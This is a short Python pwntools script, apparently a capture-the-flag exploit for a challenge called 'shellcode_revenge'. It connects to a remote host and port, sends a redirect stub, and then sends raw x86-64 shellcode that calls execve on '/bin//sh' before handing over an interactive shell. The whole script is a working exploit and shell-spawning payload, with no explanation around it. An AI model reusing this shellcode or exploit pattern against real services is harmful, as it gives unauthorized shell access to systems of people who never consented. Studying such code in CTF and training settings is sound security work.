from pwn import *

plt_read = 0x4004c0
main = 0x4005f6

r = process('shellcode_revenge')
r = remote('140.110.112.77', 2112)
raw_input('debug: ')
r.recvuntil(':)')
r.send('\x68\x3d\x06\x40\x00\xc3') # push 0x40063d ; ret
r.send('\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05') 
r.interactive()
